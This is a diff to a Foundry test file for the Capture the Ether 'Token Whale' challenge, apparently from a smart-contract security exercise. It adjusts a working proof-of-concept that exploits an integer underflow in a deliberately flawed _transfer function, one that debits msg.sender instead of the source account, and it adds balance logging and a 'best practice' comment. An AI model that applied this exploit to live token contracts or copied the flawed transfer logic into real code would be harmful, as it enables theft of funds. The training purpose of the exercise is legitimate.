@@ -8,17 +8,20 @@ contract ContractTest is Test {
  
 
 function testOverflow2() public {
-    address alice = vm.addr(1);
-    address bob = vm.addr(2);
+    address alice = makeAddr("alice");
+    address bob = makeAddr("bob");
 
     TokenWhaleChallengeContract = new TokenWhaleChallenge();   
     TokenWhaleChallengeContract.TokenWhaleDeploy(address(this));
     console.log("Player balance:",TokenWhaleChallengeContract.balanceOf(address(this)));
     TokenWhaleChallengeContract.transfer(address(alice),800);
-
+    // address(this) --> 200
+    // alice --> 800
     vm.prank(alice);   
-    TokenWhaleChallengeContract.approve(address(this),1000);
-    TokenWhaleChallengeContract.transferFrom(address(alice),address(bob),500); //exploit here
+    TokenWhaleChallengeContract.approve(address(this),500);
+    TokenWhaleChallengeContract.transferFrom(address(alice),address(bob),201); //exploit here
+    emit log_named_uint("alice balance", TokenWhaleChallengeContract.balanceOf(alice));
+    emit log_named_uint("bob balance", TokenWhaleChallengeContract.balanceOf(bob));
 
     console.log("Exploit completed, balance overflowed");
     console.log("Player balance:",TokenWhaleChallengeContract.balanceOf(address(this)));
@@ -49,6 +52,10 @@ contract TokenWhaleChallenge {
     event Transfer(address indexed from, address indexed to, uint256 value);
 
     function _transfer(address to, uint256 value) internal {
+        /**
+         * best practice
+         * _balances[from] = fromBalance - amount;
+         */
         balanceOf[msg.sender] -= value;
         balanceOf[to] += value;
 
